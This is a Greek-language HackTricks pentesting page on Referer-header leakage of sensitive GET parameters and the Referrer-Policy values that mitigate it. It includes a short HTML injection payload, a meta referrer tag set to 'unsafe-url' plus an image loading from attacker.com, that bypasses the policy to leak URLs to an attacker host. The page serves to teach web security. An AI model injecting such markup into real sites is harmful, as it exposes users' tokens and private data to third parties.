<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


# Κεφαλίδες αναφοράς και πολιτική

Η κεφαλίδα αναφοράς (Referrer) χρησιμοποιείται από τους περιηγητές για να υποδείξουν ποια ήταν η προηγούμενη επισκεφθείσα σελίδα.

## Διαρροή ευαίσθητων πληροφοριών

Εάν σε κάποιο σημείο μέσα σε μια ιστοσελίδα βρίσκονται ευαίσθητες πληροφορίες στις παραμέτρους μιας GET αίτησης, εάν η σελίδα περιέχει συνδέσμους προς εξωτερικές πηγές ή ένας επιτιθέμενος είναι σε θέση να δημιουργήσει/προτείνει (κοινωνική μηχανική) στον χρήστη να επισκεφθεί μια URL που ελέγχεται από τον επιτιθέμενο. Αυτός θα μπορούσε να αποκτήσει τις ευαίσθητες πληροφορίες μέσα στην τελευταία GET αίτηση.

## Αντιμετώπιση

Μπορείτε να κάνετε τον περιηγητή να ακολουθήσει μια **πολιτική αναφοράς (Referrer-policy)** που μπορεί να **αποτρέψει** την αποστολή των ευαίσθητων πληροφοριών σε άλλες εφαρμογές ιστού:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Αντι-αντιμετώπιση

Μπορείτε να αντικαταστήσετε αυτόν τον κανόνα χρησιμοποιώντας ένα HTML meta tag (ο επιτιθέμενος πρέπει να εκμεταλλευτεί μια ενσωμάτωση HTML):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Άμυνα

Ποτέ μην τοποθετείτε ευαίσθητα δεδομένα μέσα σε παραμέτρους GET ή διαδρομές στο URL.


<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
